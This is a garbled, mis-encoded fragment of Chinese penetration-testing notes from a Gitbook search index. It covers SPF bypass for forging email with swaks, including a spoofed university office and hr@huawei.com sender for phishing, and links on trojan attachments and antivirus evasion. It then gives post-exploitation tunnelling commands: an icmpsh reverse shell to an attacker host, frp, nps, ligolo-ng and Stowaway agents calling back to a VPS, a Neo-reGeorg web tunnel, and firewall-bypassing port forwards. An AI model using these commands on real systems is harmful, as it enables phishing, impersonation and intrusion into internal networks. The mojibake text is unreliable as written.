è®°å½•ï¼‰ä¸­åŒ…å«çš„ IP åœ°å€ï¼ˆæˆ–åœ°å€æ®µï¼‰ã€‚å¦‚æœæ²¡æœ‰æä¾›åŸŸåï¼Œåˆ™ä½¿ç”¨å½“å‰åŸŸåã€‚ä¾‹å¦‚ï¼š \"v=spf1 mx -all\" å…è®¸å½“å‰åŸŸåçš„ mx è®°å½•å¯¹åº”çš„ IP åœ°å€ã€‚ \"v=spf1 mx mx:deferrals.example.com -all\" å…è®¸å½“å‰åŸŸåå’Œ deferrals.example.com çš„ mx è®°å½•å¯¹åº”çš„ IP åœ°å€ã€‚ \"v=spf1 a/24 -all\" ç±»ä¼¼åœ°ï¼Œè¿™ä¸ªç”¨æ³•åˆ™å…è®¸ä¸€ä¸ªåœ°å€æ®µã€‚ ä¾‹å¦‚ï¼Œè¿™æ˜¯ä¸€ä¸ªæ¯”è¾ƒå¸¸è§çš„ SPF è®°å½•ï¼Œå®ƒè¡¨ç¤ºæ”¯æŒå½“å‰åŸŸåçš„ a è®°å½•å’Œ mx è®°å½•ï¼ŒåŒæ—¶æ”¯æŒä¸€ä¸ªç»™å®šçš„ IP åœ°å€ï¼›å…¶ä»–åœ°å€åˆ™æ‹’ç»ï¼š v=spf1 a mx ip4:173.194.72.103 -all include æ ¼å¼ä¸ºinclude:ï¼Œè¡¨ç¤ºå¼•å…¥åŸŸåä¸‹çš„ SPF è®°å½•ã€‚æ³¨æ„ï¼Œå¦‚æœè¯¥åŸŸåä¸‹ä¸å­˜åœ¨ SPF è®°å½•ï¼Œåˆ™ä¼šå¯¼è‡´ä¸€ä¸ªPermErrorç»“æœã€‚ä¾‹å¦‚ï¼š \"v=spf1 include:example.com -all\" å³é‡‡ç”¨å’Œ example.com å®Œå…¨ä¸€æ ·çš„ SPF è®°å½• exists æ ¼å¼ä¸ºexists:ã€‚å°†å¯¹æ‰§è¡Œä¸€ä¸ª A æŸ¥è¯¢ï¼Œå¦‚æœæœ‰è¿”å›ç»“æœï¼ˆæ— è®ºç»“æœæ˜¯ä»€ä¹ˆï¼‰ï¼Œéƒ½ä¼šçœ‹ä½œå‘½ä¸­ã€‚ ptr æ ¼å¼ä¸ºptræˆ–è€…ptr:ã€‚ä½¿ç”¨ptræœºåˆ¶ä¼šå¸¦æ¥å¤§é‡å¾ˆå¤§å¼€é”€çš„ DNS æŸ¥è¯¢ï¼Œæ‰€ä»¥è¿å®˜æ–¹éƒ½ä¸æ¨èä½¿ç”¨å®ƒã€‚ å…³äºv=spf1 è¿™æ˜¯å¿…é¡»çš„ï¼Œè¿™ä¸ªè¡¨ç¤ºé‡‡ç”¨ SPF 1 ç‰ˆæœ¬ï¼Œç°åœ¨å®ƒçš„æœ€æ–°ç‰ˆæœ¬å°±æ˜¯ç¬¬ 1 ç‰ˆã€‚ Modifiers SPF è®°å½•ä¸­è¿˜å¯ä»¥åŒ…æ‹¬ä¸¤ç§å¯é€‰çš„ modifierï¼›ä¸€ä¸ª modifier åªèƒ½å‡ºç°ä¸€æ¬¡ã€‚ redirect æ ¼å¼ä¸ºredirect= å°†ç”¨ç»™å®šåŸŸåçš„ SPF è®°å½•æ›¿æ¢å½“å‰è®°å½•ã€‚ exp æ ¼å¼ä¸ºexp=ï¼Œç›®çš„æ˜¯å¦‚æœé‚®ä»¶è¢«æ‹’ç»ï¼Œå¯ä»¥ç»™å‡ºä¸€ä¸ªæ¶ˆæ¯ã€‚è€Œæ¶ˆæ¯çš„å…·ä½“å†…å®¹ä¼šé¦–å…ˆå¯¹æ‰§è¡Œ TXT æŸ¥è¯¢ï¼Œç„¶åæ‰§è¡Œå®æ‰©å±•å¾—åˆ°ã€‚ Demo æŸ¥è¯¢å¯¹åº”åŸŸåæ˜¯å¦æœ‰SPFè®°å½• nslookup -type=txt domain æ‰¾åˆ°v=spf1ï¼ˆè¡¨ç¤ºé‡‡ç”¨ SPF 1 ç‰ˆæœ¬ï¼‰çš„txtè®°å½• SPFé…ç½®å¦‚ä¸‹ v=spf1 ip4:45.249.212.32 ip4:45.249.212.35 ip4:45.249.212.255 ip4:45.249.212.187/29 ip4:45.249.212.191 ip4:185.176.76.210 ip4:168.195.93.47 ip4:103.69.140.247 -all è§£é‡Šï¼šä¾æ¬¡åŒ¹é…ipv4åœ°å€ï¼Œå¦‚æœipåœ°å€å…¨ä¸åŒ¹é…å°±æ‹’ç» å­˜åœ¨é£é™©çš„SPFè®°å½• æœªè®¾ç½®SPF å¯ä»¥ç›´æ¥ä¼ªé€ é‚®ä»¶ è®¾ç½®ä¸å½“--ä½¿ç”¨äº†ä¸æ°å½“çš„é™å®šè¯~,+ From https://saucer-man.com/information_security/452.html#cl-6 SPFç»•è¿‡è¿›é˜¶ https://www.freebuf.com/articles/system/238215.html å®è·µ swaksä½¿ç”¨ --from test@qq.com //å‘ä»¶äººé‚®ç®±ï¼› --ehlo qq.com //ä¼ªé€ é‚®ä»¶ehloå¤´ï¼Œå¡«å‘ä»¶äººé‚®ç®±çš„åŸŸå --body \"http://www.baidu.com\" //å¼•å·ä¸­çš„å†…å®¹å³ä¸ºé‚®ä»¶æ­£æ–‡ --header \"Subject:hello\" //é‚®ä»¶å¤´ä¿¡æ¯ï¼Œsubjectä¸ºé‚®ä»¶æ ‡é¢˜ --data test.eml //å°†æ­£å¸¸æºé‚®ä»¶çš„å†…å®¹ä¿å­˜ä½œä¸ºæ­£å¸¸é‚®ä»¶å‘é€ --server mail.smtp2go.com -p 2525 -au ç”¨æˆ·å -ap å¯†ç  //é‚®ç®±æœåŠ¡å™¨ä»£å‘ï¼Œç”¨äºç»•è¿‡SPF åŸºæœ¬æµç¨‹ è‡ªå·±ç”¨é‚®ç®±ç¼–è¾‘å¥½é’“é±¼é‚®ä»¶ï¼Œç„¶åå…ˆå‘é€ç»™è‡ªå·±ï¼Œç„¶åæŸ¥çœ‹å·²å‘é€é‚®ä»¶ï¼Œç‚¹å‡»å¯¼å‡ºä¸ºemlæ–‡ä»¶ï¼š ç¼–è¾‘emlæ–‡ä»¶ï¼Œåˆ é™¤fromå€¼ä¹‹å‰çš„ä¿¡æ¯ï¼Œç„¶åä¿®æ”¹Fromå’ŒToçš„å†…å®¹ï¼ˆè¿™ä¸¤æ˜¯çœ‹åˆ°çš„æ”¶ä»¶äººå’Œå‘ä»¶äººï¼‰ ä½¿ç”¨å¦‚ä¸‹å‘½ä»¤å‘é€ æ— SPF swaks --to xxx@qq.com --from jiaowuchu@swust.edu.cn --data aaa.eml --ehlo jiaowuchu@swust.edu.cn æ•ˆæœ é‚®ä»¶åŸæ–‡ æœ‰SPF # kaliä¸­è‡ªå¸¦ swaks --to xxx@qq.com --from hr@huawei.com --data aaa.eml --server mail.smtp2go.com -p 2525 -au -ap æ€»ç»“ è¿™é‡Œå­¦ä¹ äº†ä¸€ä¸‹å¦‚ä½•è¿›è¡Œé‚®ä»¶ä¼ªé€  è¿˜éœ€è¦å­¦ä¹ çš„ä¸€äº›é—®é¢˜ å¦‚ä½•æ‰¾åˆ°ç›®æ ‡äººå‘˜çš„é‚®ç®±åœ°å€ https://forum.butian.net/share/351 å¦‚ä½•å¢åŠ é‚®ä»¶å¯ä¿¡åº¦ï¼Œé™„ä»¶æœ¨é©¬çš„åˆ¶ä½œ https://mp.weixin.qq.com/s/hi1YgUUHnFDGf26cUXJkQQ é™„ä»¶æœ¨é©¬çš„å…æ€ å‚è€ƒæ–‡ç«  https://saucer-man.com/information_security/452.html#cl-8 https://service.mail.qq.com/detail/124/995 http://www.renfei.org/blog/introduction-to-spf.html Copyright Â© Khaz 2024 all right reservedï¼Œpowered by Gitbookè¯¥æ–‡ç« ä¿®è®¢æ—¶é—´ï¼š 2023-11-11 13:47:15 "},"02.åæ¸—é€/éš§é“æ­å»º.html":{"url":"02.åæ¸—é€/éš§é“æ­å»º.html","title":"ç«¯å£è½¬å‘ä¸ä»£ç†æ­å»º","keywords":"","body":"å‰ç½®çŸ¥è¯† SOCKSä»£ç† SOCKSå…¨ç§°ä¸ºProtocol For Sessions Traversal Across Firewall Securelyï¼Œæ˜¯ä¸€ç§ä»£ç†åè®®ï¼Œå…¶åªæ˜¯ç®€å•åœ°ä¼ é€’æ•°æ®åŒ…ï¼Œè€Œå¹¶ä¸å…³å¿ƒæ˜¯ä½•ç§åº”ç”¨åè®®ï¼Œæ ‡å‡†ç«¯å£ä¸º1080ã€‚ SOCKSä»£ç†æœ‰SOCKS4å’ŒSOCKS5ä¸¤ä¸ªç‰ˆæœ¬ã€‚SOCKS4åªæ”¯æŒTCPï¼Œè€ŒSOCKS5åœ¨SOCKS4 çš„åŸºç¡€ä¸Šè¿›ä¸€æ­¥æ‰©å±•ï¼Œå¯ä»¥æ”¯æŒUDPå’Œå„ç§èº«ä»½éªŒè¯æœºåˆ¶ç­‰åè®®ã€‚ åœ¨å†…ç½‘æ¸—é€ä¸­ï¼Œé€šè¿‡æ­å»ºSOCKSä»£ç†ï¼Œå¯ä»¥ä¸ç›®æ ‡å†…ç½‘ä¸»æœºè¿›è¡Œé€šä¿¡ï¼Œé¿å…å¤šæ¬¡ä½¿ç”¨ç«¯å£è½¬å‘ã€‚ æ¢æµ‹ç›®æ ‡å„ç§åè®®æ˜¯å¦å‡ºç½‘åŠå¯¹åº”éš§é“æ­å»º ICMP ping 114.114.114.114 -n 1 #Windows ping 114.114.114.114 -c 1 #Linux éš§é“æ­å»º é€šè¿‡dataéƒ¨åˆ†æ¥ä¼ è¾“æ•°æ® icmpsh -t host å‘é€pingè¯·æ±‚çš„ä¸»æœºipåœ°å€ï¼Œå³æ”»å‡»æœºçš„IP [è¯¥å‘½ä»¤å¿…é¡»å­˜åœ¨] -d milliseconds è¯·æ±‚æ—¶é—´é—´éš”ï¼ˆæ¯«ç§’ï¼‰ -o milliseconds å“åº”è¶…æ—¶æ—¶é—´ï¼ˆæ¯«ç§’ï¼‰ -s bytes æœ€å¤§æ•°æ®ç¼“å†²åŒºå¤§å°ï¼ˆå­—èŠ‚ï¼‰ æ”»å‡»æœº pip2 install impacket # å®‰è£…ä¾èµ– sudo python2 icmpsh_m.py æ”»å‡»æœºIP ç›®æ ‡æœºIP ç›®æ ‡æœºä¸Š sysctl -w net.ipv4.icmp_echo_ignore_all=1 #å…³é—­æœ¬åœ°ICMPåº”ç­”ï¼Œé˜²æ­¢ä¸ç¨³å®š ./icmpsh.exe -t æ”»å‡»æœºIP ã€å†…ç½‘å­¦ä¹ ç¬”è®°ã€‘6ã€ICMPéš§é“å·¥å…·ä½¿ç”¨ | TeamsSix HTTP curl http://www.baidu.com DNS nslookup baidu.com éš§é“æ­å»º zfl9/dns2tcp: å°† dns æŸ¥è¯¢ä» udp è½¬ä¸º tcp çš„å®ç”¨å·¥å…· (github.com) vaycore/DNStxt-exp: ä¸€ä¸ªæä¾›æŸ¥è¯¢ TXT è®°å½•çš„ DNS æœåŠ¡åˆ©ç”¨å·¥å…·ã€‚ä¾‹å¦‚ï¼šå¯é…åˆ Windows ä¸‹çš„ certutil å·¥å…·ä¼ è¾“å°æ–‡ä»¶ï¼ˆ64KBï¼‰ (github.com) TCP Telent ip ä»£ç†æ­å»º åå‘ä»£ç†æ­å»º--ç›®æ ‡èƒ½è®¿é—®VPS Nps æœåŠ¡ç«¯ï¼ˆå…¬ç½‘æœåŠ¡å™¨ï¼‰ sudo ./nps install #å®‰è£… sudo nps start #å¯åŠ¨ sudo nps stop #åœæ­¢ sudo nps reload #æœåŠ¡ç«¯é…ç½®æ–‡ä»¶é‡è½½ é…ç½®æ–‡ä»¶/etc/nps/conf/nps.confï¼Œä¸»è¦ä¿®æ”¹ # httpä»£ç† http_proxy_ip=0.0.0.0 http_proxy_port=80 https_proxy_port=443 https_just_proxy=true ##æ¡¥æ¥ bridge_type=tcp bridge_port=8024 ##å®¢æˆ·ç«¯ä¸æœåŠ¡ç«¯è¿æ¥ç«¯å£ bridge_ip=0.0.0.0 # webç«¯è®¾ç½® web_host=xxx # å…¬ç½‘ip web_username=admin # webç«¯ç™»å½•è´¦å·å¯†ç  å¯ä»¥ä¿®æ”¹ web_password=de1ta web_port = 8080 # webç«¯ç«¯å£ é»˜è®¤é…ç½®è¿è¡ŒnpsæœåŠ¡ç«¯å¯åŠ¨ä¼šå ç”¨80ï¼Œ8080ï¼Œ8024ç«¯å£ å®¢æˆ·ç«¯ï¼ˆå†…ç½‘ä¸»æœºï¼‰ ä½¿ç”¨æ— é…ç½®æ–‡ä»¶æ¨¡å¼ ä½¿ç”¨è¯¥å‘½ä»¤å¯åŠ¨å®¢æˆ·ç«¯å³å¯è¿æ¥è‡³æœåŠ¡ç«¯ æˆåŠŸè¿æ¥åï¼Œç‚¹å‡»éš§é“æŒ‰é’®æ¥åˆ›å»ºéš§é“ proxifierä½¿ç”¨ å¡«å†™é…ç½®å®¢æˆ·ç«¯æ—¶é…ç½®çš„è´¦å¯† Frp æœåŠ¡ç«¯ï¼ˆå…¬ç½‘æœåŠ¡å™¨ï¼‰ é…ç½®frps.ini [common] bind_port = 7000 # å®¢æˆ·ç«¯ä¸æœåŠ¡ç«¯é€šä¿¡çš„ç«¯å£ å¯åŠ¨ sudo nohup ./frps -c frps.ini & å®¢æˆ·ç«¯ï¼ˆå†…ç½‘ä¸»æœºï¼‰ é…ç½®frpc.ini [common] server_addr = 47.120.7.67 # æœåŠ¡ç«¯IP server_port = 7000 # é€šä¿¡ç«¯å£ [socks5_proxy] type = tcp remote_port = 8888 # æœåŠ¡ç«¯ä»£ç†ç«¯å£ plugin = socks5 use_encryption = true # æ˜¯å¦åŠ å¯† use_compression = true # æ˜¯å¦å‹ç¼© å¯åŠ¨ start/b C:\\tmp\\frpc.exe -c frpc.ini Ligolo-ng æœåŠ¡ç«¯ï¼ˆå…¬ç½‘æœºå™¨ï¼‰ ./proxy 0.0.0.0:53 -autocert å®¢æˆ·ç«¯ï¼ˆå†…ç½‘ä¸»æœºï¼‰ ./agent -connect ip:53 å›åˆ°æœåŠ¡ç«¯ï¼ˆå…¬ç½‘æœºå™¨ï¼‰ ligolo-ng Â» ifconfig # æŸ¥çœ‹agentç«¯ç½‘ç»œä¿¡æ¯ å›åˆ°bash æ·»åŠ è·å¾—çš„ç½‘æ®µä¿¡æ¯ sudo ip route add 192.168 .110 .0 / 24 dev ligolo ligolo-ng Â» start_tunnel # å¼€å¯éš§é“ SoftEtherVPN SoftEtherVPN CSçš„socks4ä»£ç†--ä¸å¥½ç”¨ é¦–å…ˆéœ€è¦å°†å¿ƒè·³sleepè®¾ç½®ä¸º0 Beaconå³é”® åˆ›å»ºäº†socks4éš§é“ socks4:CSæœåŠ¡ç«¯IP:é€‰æ‹©çš„port æ­£å‘ä»£ç†æ­å»º--VPSèƒ½è®¿é—®ç›®æ ‡ Neo-reGeorg ç”ŸæˆæœåŠ¡ç«¯ python neoreg.py generate -k password ä¸Šä¼ å¯¹åº”çš„tunnelè‡³ç›®æ ‡ä¸»æœº åœ¨æœ¬åœ°å»ºç«‹Socks5ä»£ç† python neoreg.py -k password -u http://xx/tunnel.php å¤šçº§ä»£ç† åœºæ™¯ Stowaway ph4ntonn/Stowaway: ğŸ‘»Stowaway -- Multi-hop Proxy Tool for pentesters (github.com) æ§åˆ¶ç«¯VPS å¼€å¯ç›‘å¬ # é»˜è®¤ç›‘å¬0.0.0.0ï¼Œ-sä¸ºå¯†ç  ./linux_x64_admin -l 8000 -s 123 èŠ‚ç‚¹ç®¡ç† detail å±•ç¤ºåœ¨çº¿èŠ‚ç‚¹çš„è¯¦ç»†ä¿¡æ¯ topo å±•ç¤ºåœ¨çº¿èŠ‚ç‚¹çš„çˆ¶å­å…³ç³» use ä½¿ç”¨æŸä¸ªagent exit é€€å‡º ç¬¬ä¸€å±‚å†…ç½‘ win2012-1è¿æ¥VPSç«¯å£ # --reconnecté‡è¿é—´éš”æ—¶é—´ ./windows_x64_agent.exe -c 192.168.125.134:8000 -s 123 --reconnect 8 æ§åˆ¶ç«¯VPS use 0 # è¿›å…¥win2012-1èŠ‚ç‚¹ socks 7777 admin admin # åˆ›å»ºç¬¬ä¸€å±‚å†…ç½‘ä»£ç† ç¬¬äºŒå±‚å†…ç½‘ æ§åˆ¶ç«¯VPS use 0 # è¿›å…¥win2012-1èŠ‚ç‚¹ listen win7è¿æ¥win2012-1ç«¯å£ # --reconnecté‡è¿é—´éš”æ—¶é—´ ./windows_x64_agent.exe -c 192.168.10.9:10000 -s 123 --reconnect 8 Frp ç¬¬ä¸€å±‚å†…ç½‘ æœåŠ¡ç«¯ï¼ˆVPSï¼‰ é…ç½®frps.ini [common] bind_port = 7000 # å®¢æˆ·ç«¯ä¸æœåŠ¡ç«¯é€šä¿¡çš„ç«¯å£ å¯åŠ¨ sudo nohup ./frps -c frps.ini & å®¢æˆ·ç«¯ï¼ˆWin2012-1ï¼‰ é…ç½®frpc.ini [common] server_addr = 192.168.125.134 # æœåŠ¡ç«¯IP server_port = 7000 # é€šä¿¡ç«¯å£ [socks5_proxy] type = tcp remote_port = 8888 # æœåŠ¡ç«¯ä»£ç†ç«¯å£ plugin = socks5 use_encryption = true # æ˜¯å¦åŠ å¯† use_compression = true # æ˜¯å¦å‹ç¼© ç¬¬äºŒå±‚å†…ç½‘ Win2012-1 é…ç½®frps.ini [common] bind_addr = 192.168.10.2 bind_port = 7000 é…ç½®frpc.ini [common] server_addr = 192.168.125.134 # æœåŠ¡ç«¯IP server_port = 7000 # é€šä¿¡ç«¯å£ [socks5_proxy] type = tcp remote_port = 8888 # æœåŠ¡ç«¯ä»£ç†ç«¯å£ use_encryption = true # æ˜¯å¦åŠ å¯† use_compression = true # æ˜¯å¦å‹ç¼© # plugin = socks5 # ä¸èƒ½åŠ ä¸Šè¿™ä¸ª #ç›¸è¾ƒäºä¸€çº§ä»£ç†ï¼Œå¢åŠ å¦‚ä¸‹ä»£ç†æœåŠ¡å™¨frps.ini local_ip = 192.168.10.2 local_port = 7777 å¯åŠ¨ start/b C:\\tmp\\frps.exe -c frps.ini start/b C:\\tmp\\frpc.exe -c frpc.ini win7 é…ç½®frpc.ini [common] server_addr = 192.168.125.134 server_port = 7000 [socks5_proxy] type = tcp remote_port = 8888 # æœåŠ¡ç«¯ä»£ç†ç«¯å£ use_encryption = true # æ˜¯å¦åŠ å¯† use_compression = true # æ˜¯å¦å‹ç¼© plugin = socks5 ç«¯å£è½¬å‘ å¸¸è§åœºæ™¯ ç›®æ ‡æœ‰å…¬ç½‘IP â€‹ å‡è®¾æ­¤æ—¶å·²ç»è·å–äº†Windows Server 2012çš„æ§åˆ¶æƒ,éœ€è¦ç™»å½•å…¶è¿œç¨‹æ¡Œé¢æŸ¥çœ‹æƒ…å†µï¼Œä½†æ˜¯é˜²ç«å¢™å¯¹3389ç«¯å£åšäº†é™åˆ¶ï¼Œä¸å…è®¸å¤–ç½‘æœºå™¨å¯¹3389ç«¯å£è¿›è¡Œè¿æ¥ã€‚é‚£ä¹ˆï¼Œé€šè¿‡ç«¯å£è½¬å‘ï¼Œå¯ä»¥å°†3389ç«¯å£è½¬å‘åˆ°å…¶ä»–é˜²ç«å¢™å…è®¸çš„ç«¯å£ä¸Šï¼Œå¦‚4444ç«¯å£ã€‚ â€‹ æ•ˆæœï¼šç»•è¿‡é˜²ç«å¢™é™åˆ¶ï¼Œé€šè¿‡4444ç«¯å£è¿›è¡ŒRDPè¿œç¨‹è¿æ¥ å†…ç½‘ä¸»æœºç«¯å£è½¬å‘åˆ°DMZåŒºä¸»æœºç«¯å£ â€‹ å‡è®¾å·²ç»è·å–Windows Server 2012çš„æ§åˆ¶æƒï¼Œç»è¿‡ä¿¡æ¯æ”¶é›†ï¼Œè·å¾—å†…ç½‘ä¸­MySQLæœåŠ¡å™¨çš„SSHç™»å½•å‡­æ®ï¼Œæ¥ä¸‹æ¥éœ€è¦ç™»å½•è¿™å°æœåŠ¡å™¨ã€‚ä½†æ˜¯æœåŠ¡å™¨ä½äºå†…ç½‘ï¼Œæ— æ³•ç›´æ¥é€šè¿‡IPåœ°å€è¿›è¡Œè®¿é—®ï¼Œæ‰€ä»¥éœ€è¦é€šè¿‡ç«¯å£æ˜ å°„ï¼Œå°† MySQLæœåŠ¡å™¨çš„22ç«¯å£æ˜ å°„åˆ°Windows Server 2012ä¸Šçš„ç«¯å£å¦‚2222ã€‚ â€‹ æ•ˆæœï¼šè®¿é—®DMZåŒºçš„Windows Server 2012çš„2222ç«¯å£å®è´¨ä¸Šæ˜¯è®¿é—®å†…ç½‘MySqlæœåŠ¡å™¨çš„22ç«¯å£ ç›®æ ‡æ— å…¬ç½‘IP â€‹ å‡è®¾å·²ç»è·å– Windows Server 2012çš„æ§åˆ¶æƒï¼Œéœ€è¦ç™»å½•å…¶è¿œç¨‹æ¡Œé¢æŸ¥çœ‹æƒ…å†µï¼Œä½†æ˜¯Windows Server 2012æ²¡æœ‰å…¬ç½‘IPåœ°å€,æ— æ³•ç›´é€šè¿‡IPåœ°å€è¿›è¡Œè®¿é—®,æ‰€ä»¥éœ€è¦å…¬ç½‘VPSç›‘å¬ä¸€ä¸ªç«¯å£ï¼Œå°†Windows Server 2012çš„3389ç«¯å£è½¬å‘åˆ°VPSçš„ç«¯å£å¦‚4444ä¸Šã€‚ â€‹ æ•ˆæœï¼šè®¿é—®VPSçš„4444ç«¯å£å®è´¨ä¸Šæ˜¯è®¿é—®Windows Server 2012çš„3389ç«¯å£ å¦‚ä½•è½¬å‘ Windows netsh ç«¯å£è½¬å‘ï¼ˆåŒç½‘å¡ç”¨ï¼‰ netshä»…æ”¯æŒTCPåè®®ï¼Œ é€‚ç”¨äºåŒç½‘å¡æœåŠ¡å™¨ å°†å†…ç½‘çš„3389ç«¯å£è½¬å‘åˆ°å¤–ç½‘çš„6666ç«¯å£ä¸Šï¼Œå®ç°è®¿é—®å¤–ç½‘çš„6666ç«¯å£å³è®¿é—®å†…ç½‘çš„3389ç«¯å£ å¯åŠ¨è½¬å‘ #æŸ¥çœ‹ç°æœ‰è§„åˆ™ netsh interface portproxy show all #æ·»åŠ è½¬å‘è§„åˆ™ netsh interface portproxy set v4tov4 listenaddress=å¤–ç½‘IP listenport=6666 connectaddress=å†…ç½‘IP connectport=3389 å–æ¶ˆè½¬å‘ #åˆ é™¤è½¬å‘è§„åˆ™ netsh interface portproxy delete v4tov4 listenport=6666 #xpéœ€è¦å®‰è£…ipv6 netsh interface ipv6 install Linux iptables ç«¯å£è½¬å‘ï¼ˆé«˜æƒé™ç”¨ï¼‰ Linuxç«¯å£å¤ç”¨ Â» 1ight å°†å†…ç½‘çš„3389ç«¯å£è½¬å‘åˆ°å¤–ç½‘çš„3389ç«¯å£ä¸Š ç¼–è¾‘é…ç½®æ–‡ä»¶ vim /etc/sysctl.conf net.ipv4.ip_forward = 1#å¼€å¯IPè½¬å‘ å…³é—­æœåŠ¡ service iptables stop é…ç½®è§„åˆ™ å‡è®¾ éœ€è¦è®¿é—®çš„å†…ç½‘åœ°å€ï¼š10.1.1.11ï¼ˆWindowsï¼‰ å†…ç½‘è¾¹ç•ŒwebæœåŠ¡å™¨ï¼š192.168.100.100ï¼ˆLinuxï¼‰ iptables -t nat -A PREROUTING --dst 192.168.100.100 -p tcp --dport 3389 -j DNAT--to-destination 10.1.1.11:3389 å°†ç›®æ ‡IPä¸º192.168.100.100ä¸”ç›®æ ‡ç«¯å£ä¸º3389çš„TCPæ•°æ®åŒ…ï¼Œè½¬å‘åˆ°10.1.1.11çš„3389ç«¯å£ã€‚ iptables -t nat -A POSTROUTING --dst 10.1.1.11 -p tcp --dport 3389 -j SNAT --to-source 192.168.100.100 å°†ç›®æ ‡IPä¸º10.1.1.11ä¸”ç›®æ ‡ç«¯å£ä¸º3389çš„TCPæ•°æ®åŒ…ï¼Œå‘é€å‡ºå»æ—¶ï¼Œå°†æºIPåœ°å€æ”¹ä¸º192.168.100.100 (ç›¸å½“äºå®ç°äº†ç½‘ç»œåœ°å€è½¬æ¢ï¼ˆNATï¼‰ï¼Œå°†å†…éƒ¨ç§æœ‰ç½‘ç»œä¸­çš„IPåœ°å€è½¬æ¢ä¸ºå…¬ç½‘IPåœ°å€) ä¿å­˜å¹¶é‡å¯æœåŠ¡ service iptables save && service iptables start SSHç«¯å£è½¬å‘ SSH ç«¯å£è½¬å‘åŠŸèƒ½èƒ½å¤Ÿå°†å…¶ä»– TCP ç«¯å£çš„ç½‘ç»œæ•°æ®é€šè¿‡ SSH é“¾æ¥æ¥è½¬å‘ï¼Œå¹¶ä¸”è‡ªåŠ¨æä¾›äº†ç›¸åº”çš„åŠ å¯†åŠè§£å¯†æœåŠ¡ã€‚å…¶å®è¿™ä¸€æŠ€æœ¯å°±æ˜¯æˆ‘ä»¬å¸¸å¸¸å¬è¯´çš„éš§é“(tunnel)æŠ€æœ¯ï¼ŒåŸå› æ˜¯ SSH ä¸ºå…¶ä»– TCP é“¾æ¥æä¾›äº†ä¸€ä¸ªå®‰å…¨çš„é€šé“æ¥è¿›è¡Œä¼ è¾“ã€‚ æ¨èé˜…è¯»ï¼šSSH ç«¯å£è½¬å‘æ•™ç¨‹ | ä¸‰ç‚¹æ°´ (lotabout.me) æœ¬åœ°è½¬å‘ æœ¬åœ°ç«¯å£è½¬å‘æŒ‡çš„æ˜¯åœ¨æœ¬æœºä¸Šå‘èµ·è¯·æ±‚ï¼Œç”± ssh client è½¬å‘åˆ°è¿œç¨‹çš„æœºå™¨ä¸Š å‡è®¾Aä¸ºæ”»å‡»æœºVPSï¼ŒBä¸ºDMZåŒºä¸»æœºï¼ŒCä¸ºå†…ç½‘ä¸»æœºï¼ŒAèƒ½è®¿é—®B # ssh clientå³æ”»å‡»æœºVPSæ‰§è¡Œ ssh -CfNg -L 1234:ip_c:3389 user_b@ip_b å‚æ•°è§£é‡Š -C é€‰é¡¹ä½¿ç”¨å‹ç¼©ç®—æ³•è¿›è¡Œæ•°æ®ä¼ è¾“ï¼Œå¯ä»¥æé«˜ä¼ è¾“æ•ˆç‡ã€‚ -f é€‰é¡¹å°†SSHä¼šè¯æ”¾å…¥åå°è¿è¡Œã€‚ -N é€‰é¡¹è¡¨ç¤ºä¸æ‰§è¡Œè¿œç¨‹å‘½ä»¤ï¼Œä»…ç”¨äºå»ºç«‹éš§é“ã€‚ -g é€‰é¡¹å…è®¸å…¶ä»–ä¸»æœºè¿æ¥è¯¥éš§é“ã€‚ -L 1234:ip_c:3389 user_b@ip_b é€‰é¡¹æŒ‡å®šåœ¨æœ¬åœ°ç›‘å¬1234ç«¯å£ï¼Œå¹¶å°†æ‰€æœ‰é€šè¿‡è¯¥ç«¯å£çš„æµé‡è½¬å‘åˆ°ç›®æ ‡ä¸»æœºCçš„3389ç«¯å£ã€‚ å®ç°äº†è®¿é—®æ”»å‡»æœº1234ç«¯å£å®è´¨ä¸Šæ˜¯è®¿é—®å†…ç½‘ä¸»æœºCçš„3389ç«¯å£ è¿œç¨‹è½¬å‘ æŠŠæœ€ç»ˆè¯·æ±‚çš„å‘èµ·æ–¹ï¼ˆæœºå™¨ Aï¼‰ä¸ºâ€œæœ¬åœ°â€ï¼ŒæœåŠ¡æ‰€åœ¨çš„æœºå™¨ B/C ä¸ºâ€œè¿œç¨‹â€ï¼Œåœ¨æœ¬åœ°æœºå™¨ä¸Šæ‰§è¡Œ ssh å‘½ä»¤å°±ç§°ä¸ºâ€œæœ¬åœ°è½¬å‘â€ï¼Œåœ¨è¿œç¨‹æœºå™¨ä¸Šæ‰§è¡Œå‘½ä»¤å°±ç§°ä¸ºâ€œè¿œç¨‹è½¬å‘â€ å‡è®¾Aä¸ºæ”»å‡»æœºVPSï¼ŒBä¸ºDMZåŒºä¸»æœºï¼ŒCä¸ºå†…ç½‘ä¸»æœºï¼ŒAä¸èƒ½è®¿é—®Bï¼ŒBèƒ½è®¿é—®A # ssh cilentå³DMZåŒºä¸»æœºæ‰§è¡Œ ssh -CfNg -R 9992:ip_c:3389 user_a@ip_a å‚æ•°è§£é‡Š -R 9992:ip_c:3389 user_a@ip_a é€‰é¡¹æŒ‡å®šåœ¨è¿œç¨‹ä¸»æœºï¼ˆå³æ”»å‡»æœºvpsï¼‰ç›‘å¬9992ç«¯å£ï¼Œå¹¶å°†æ‰€æœ‰é€šè¿‡è¯¥ç«¯å£çš„æµé‡è½¬å‘åˆ°æœ¬åœ°çš„å†…ç½‘ä¸»æœºCçš„3389ç«¯å£ã€‚ å®ç°äº†è®¿é—®æ”»å‡»æœº9992ç«¯å£å®é™…ä¸Šæ˜¯è®¿é—®å†…ç½‘ä¸»æœºCçš„3389ç«¯å£ åŠ¨æ€è½¬å‘ æœ¬åœ°è½¬å‘å’Œè¿œç¨‹è½¬å‘éƒ½åªè½¬å‘ä¸€ä¸ªç«¯å£ï¼ŒåŠ¨æ€è½¬å‘å¯ä»¥è½¬å‘æ‰€æœ‰ç«¯å£ # ssh cilnetå³æ”»å‡»æœºVPSæ‰§è¡Œ ssh -qTfnN -D 1234 user_b@ip_b å‚æ•°è§£é‡Š -q é€‰é¡¹è¡¨ç¤ºå®‰é™æ¨¡å¼ï¼Œå‡å°‘è¾“å‡ºä¿¡æ¯ã€‚ -T é€‰é¡¹è¡¨ç¤ºä¸åˆ†é…ç»ˆç«¯ã€‚ -f é€‰é¡¹å°†SSHä¼šè¯æ”¾å…¥åå°è¿è¡Œã€‚ -n é€‰é¡¹è¡¨ç¤ºä¸æ‰§è¡Œè¿œç¨‹å‘½ä»¤ã€‚ -N é€‰é¡¹è¡¨ç¤ºä¸æ‰§è¡Œè¿œç¨‹å‘½ä»¤ï¼Œä»…ç”¨äºå»ºç«‹éš§é“ã€‚ -D 1080 